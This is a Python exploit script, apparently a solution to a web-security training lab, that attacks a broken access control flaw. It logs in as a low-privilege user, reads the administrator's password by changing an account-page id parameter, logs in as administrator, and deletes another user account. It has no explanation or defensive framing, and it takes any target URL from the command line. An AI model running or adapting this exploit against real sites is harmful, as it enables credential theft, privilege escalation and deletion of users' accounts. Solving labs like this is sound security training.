import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(s, url) :
    r = s.get(url, verify=False, proxies=proxies)
    matches = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', r.text)
    if matches :
        csrf =matches.group(1)
        return csrf
    else :
        return None

def broken_authentification_exploit(session, url) :
    # Get CSRF token  
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)
    
    # Login as the wiener user
    data = {"csrf":csrf_token, 'username':'wiener', 'password':'peter'}
    r = session.post(login_url, data=data, verify=False, proxies=proxies)
    
    if "Log out" in r.text :
        
        print("(+) The wiener user has logged in successfully!")
        print('(+) Retrieving the admin user password...')
        admin_url = url + "/my-account?id=administrator"
        r = session.get(admin_url, allow_redirects=False, verify=False, proxies=proxies)
        matches = re.search(r"\<input required type=password name=password value='(.*)'\/\>", r.text)
        
        if matches :
            password = matches.group(1)
            print("(+) Here is the admin's password : " + password)
            
            session = requests.Session()
            # Login as the admin user
            login_url = url + "/login"
            csrf_token = get_csrf_token(session, login_url)
            data = {"csrf":csrf_token, 'username':'administrator', 'password':password}
            r = session.post(login_url, data=data, verify=False, proxies=proxies)
            
            if 'Log out' in r.text :
                print("(+) Successfully logged in as the administrator user.")
                
                r = session.get(url + '/admin', verify=False, proxies=proxies)
                
                if 'carlos' in r.text :
                    print('(+) The carlos exist so starting deletion...')
                    
                    matches = re.search(r'\<a href="(.*carlos)"\>Delete\<\/a\>', r.text)
                    if matches :
                        # Deleting the carlos user
                        delete_url = url + matches.group(1)
                        r = session.get(delete_url, verify=False, proxies=proxies)
                        
                        if 'User deleted successfully!' in r.text :
                            print("(+) Successfully deleted the carlos user.")
                        else :
                            print("(-) Could not delete the carlos user.")
                            sys.exit(-1)
                    else :
                        print("(-) Could not find the deleting url.")
                else :
                    print('(-) Could not retrieve the carlos user.')
                    sys.exit(-1)
            else :
                print("(-) Could not login as the administrator user.")
                sys.exit(-1)
        else :
            print("(-) Could not retrieve the admin' user api key.")
            sys.exit(-1)
            
    else :
        print("Could not login as the wiener user!")
        sys.exit(-1)

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)